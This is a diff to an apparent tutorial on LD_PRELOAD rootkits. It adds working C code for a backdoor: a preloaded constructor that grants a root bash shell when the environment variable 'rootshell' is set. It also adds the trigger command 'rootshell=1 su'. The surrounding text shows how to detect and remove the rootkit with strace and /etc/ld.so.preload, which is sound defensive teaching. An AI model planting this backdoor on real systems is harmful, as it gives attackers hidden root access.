@@ -437,6 +437,29 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     return orig_openat(dirfd, pathname, flags, mode);
 }
 
+So far we have looked at intercepting/redircecting for stealth. Hiding the module itself as well as hiding the entry in virtual memory. What's the point? Well let's say the rootkits primary payload is a rootshell. which could be done with the following code.
+
+/*rootshell.c*/
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <unistd.h>
+
+void __attribute__((constructor)) init() {
+    if (getenv("rootshell")) {
+        unsetenv("rootshell");
+        unsetenv("LD_PRELOAD");
+        setuid(0);
+        setgid(0);
+        execl("/bin/bash", "bash", NULL);
+    }
+}
+
+In this way, the attacker could type
+
+# rootshell=1 su
+
+and would get a rootshell. 
+
 However, as shown earlier, using strace leaves nowhere to hide. Now that we know the name of the shared library that is doing the hiding and intercepting is named libhide.so.2 in the /usr/local/lib/ directory, we can simply rename the file and then open the real /etc/ld.so.preload and remove the shared library from being preloaded.
 
 # sudo mv /usr/local/lib/libhide.so.2 /usr/local/lib/libhide.so.2.disabled
